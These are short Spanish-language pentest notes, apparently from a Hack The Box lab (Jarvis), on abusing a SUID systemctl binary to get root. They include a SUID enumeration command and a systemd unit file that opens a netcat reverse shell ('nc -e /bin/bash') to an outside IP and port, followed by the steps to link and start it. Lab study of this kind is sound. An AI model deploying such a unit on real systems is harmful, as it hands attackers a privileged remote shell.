
## DESCRIPTION

ENUMERACIÓN: Buscamos ficheros ocn el SUID activado → find / -perm -4000 2>/dev/null

![[Pasted image 20230603103740.png]]

#### Mas información
* INFORMACIÓN: https://gtfobins.github.io/gtfobins/systemctl/
* https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html


## EXPLOITATION

1.  Creamos un archivo reverse shell:
![[Pasted image 20230603103804.png]]

2. Creamos el ficher del servicio:
EJECUCIÓN DIRECTA:
```
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.10 5555'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target

```

![[Pasted image 20230603103844.png]]

EJECUCIÓN DESDE SCRIPT --> ME DA UN FALLO

```
[Unit]
Description=test

[Service]
Type=oneshot
ExecStart=/tmp/shell.sh

[Install]
WantedBy=multi-user.target
```

![[Pasted image 20230603103922.png]]
**!!NOTA IMPORTANTE!!** poner oneshot para que no se vuelva loco
3. Creamos el link al servicio
NOTA: no ha sido posible crear el link en la carpeta tmp
![[Pasted image 20230603104029.png]]

4. Ejecutamos:

```
systemctl start shell (o como se llame el servicio)
```

## MACHINES

* Hack The Box: jARVIS

**!!NOTA IMPORTANTE!!** 